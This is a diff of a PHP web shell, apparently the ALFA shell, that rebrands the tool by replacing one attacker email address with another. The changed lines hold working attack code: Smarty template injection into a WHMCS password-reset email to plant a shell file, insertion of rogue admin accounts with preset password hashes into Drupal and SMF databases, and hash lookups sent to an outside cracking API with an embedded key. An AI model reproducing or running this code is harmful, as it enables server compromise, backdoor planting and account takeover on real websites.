@@ -1939,19 +1939,19 @@ $tempSave = str_replace("'","\'",$tempSave1);
 mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($conn));
 $inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
 $result = mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('sukabintang84@gmail.com')";
+$create = "insert into tblclients (email) values('trinitylegion@yahoo.com')";
 $result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version') && $method == 'auto'){
 $AlfaSole = new AlfaCURL(true);
 $saveurl = $AlfaSole->Send($path."/pwreset.php");
 $getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=sukabintang84@gmail.com");
+$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=trinitylegion@yahoo.com");
 $backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
 $Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
 __alert("shell injectet...");
-$ff= 'http://'.$path."/sukabintang01.php";
+$ff= 'http://'.$path."/trinitylegion.php";
 output($ff);}else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>sukabintang84@gmail.com</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>trinitylegion@yahoo.com</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
 }if(isset($_POST['alfa2']) && $_POST['alfa2']== 'mybb'){
 AlfaNum(1,2,3,5);
 echo __pre()."<p><div class='txtfont_header'>| MyBB |</div></p><center><center>".getConfigHtml("mybb")."<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
@@ -2279,7 +2279,7 @@ if($_POST['alfa3'] == '>>'){
 $hash = $_POST['alfa2'];
 if(!empty($hash)){
 $hash_type = $_POST['alfa4'];
-$email = "sukabintang84@gmail.com";
+$email = "trinitylegion@yahoo.com";
 $code = "7b9fa79f92c3cd96";
 $target = "https://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
 $resp = @file_get_contents($target);
@@ -3506,19 +3506,19 @@ $tempSave1 = $soleGet['message'];
 $tempSave = str_replace("'","\'",$tempSave1);
 $inject = "UPDATE tblemailtemplates SET message='$Def' WHERE name='Password Reset Validation'";
 $result=@mysqli_query($conn,$inject) or die (mysqli_error($conn));
-$create = "insert into tblclients (email) values('sukabintang84@gmail.com')";
+$create = "insert into tblclients (email) values('trinitylegion@yahoo.com')";
 $result2 =@mysqli_query($conn,$create) or die (mysqli_error($conn));
 if(function_exists('curl_version')){
 $AlfaSole = new AlfaCURL(true);
 $saveurl = $AlfaSole->Send($path."/pwreset.php");
 $getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
-$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=sukabintang84@gmail.com");
+$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=trinitylegion@yahoo.com");
 $backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
 $Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
 __alert('File Created...');
 echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$path."/".$fname."'>Click Here !</a></font></b></center><br><br>";
 }else{
-echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>sukabintang84@gmail.com</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
+echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target </font><font color=red>\" ".$path."/pwreset.php \"</font><br/><font color=\"#FFFFFF\"> and reset password with email</font> => <font color=red>trinitylegion@yahoo.com</font><br/><font color=\"#FFFFFF\">and go to</font> <font color=red>\" ".$path."/".$fname." \"</font></b></center><br><br>";
 }}}}
 if(isset($_POST['alfa1']) && ($_POST['alfa1'] == 'vb')){
 echo __pre();
@@ -3951,7 +3951,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'Trinity', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'trinitylegion@yahoo.com', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form>';
@@ -3994,7 +3994,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'Trinity', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'trinitylegion@yahoo.com', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4037,7 +4037,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'Trinity', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'trinitylegion@yahoo.com', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4088,7 +4088,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'Trinity', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'trinitylegion@yahoo.com', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4128,7 +4128,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'Trinity', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'trinitylegion@yahoo.com', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4163,7 +4163,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'Trinity', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'trinitylegion@yahoo.com', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4199,7 +4199,7 @@ $table = array('td1' =>
  'td7' =>
  array('color' => 'FF0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'Trinity', 'inputSize' => '50', 'disabled' => true),
  'td8' =>
- array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'sukabintang84@gmail.com', 'inputSize' => '50')
+ array('color' => 'FF0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'trinitylegion@yahoo.com', 'inputSize' => '50')
 );
 create_table($table);
 echo '<p><input value=" " name="send" type="submit"></p></form></center>';
@@ -4247,7 +4247,7 @@ $getDescuid = @mysqli_query($conn,"select uid from users order by uid desc limit
 $getDescuid = @mysqli_fetch_assoc($getDescuid);
 $getDescuid = $getDescuid['uid'];
 $getdescuid = $getDescuid++;
-$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','sukabintang84@gmail.com','filtered_html','1','Europe/Berlin','sukabintang84@gmail.com')") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"insert into users (uid,name,pass,mail,signature_format,status,timezone,init) values('$getDescuid','$admin','\$S\$DP2y9AbolCBOd\/WyQcpzu4zF57qE0noyCNeXZWv.37R66VsFjOiC','trinitylegion@yahoo.com','filtered_html','1','Europe/Berlin','trinitylegion@yahoo.com')") or die(mysqli_error($conn));
 $solevisible=@mysqli_query($conn,"select uid from users where name='".$admin."'") or die(mysqli_error($conn));
 $sole = mysqli_num_rows($solevisible);
 if ($sole == 1){
@@ -4289,7 +4289,7 @@ $prefix = $_POST['alfa7'];
 $admin = $_POST['alfa8'];
 $conn=@mysqli_connect($localhost,$username,$password,$database) or die(mysqli_error($conn));
 $setpwAlg = sha1(strtolower($admin) . 'solevisible');
-$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','sukabintang84@gmail.com')") or die(mysqli_error($conn));
+$solevisible=@mysqli_query($conn,"insert into {$prefix}members (id_member,member_name,id_group,real_name,passwd,email_address) values(null,'$admin','1','$admin','$setpwAlg','trinitylegion@yahoo.com')") or die(mysqli_error($conn));
 if($solevisible){
 __alert('Success... '.$admin.' is created...');}
 }
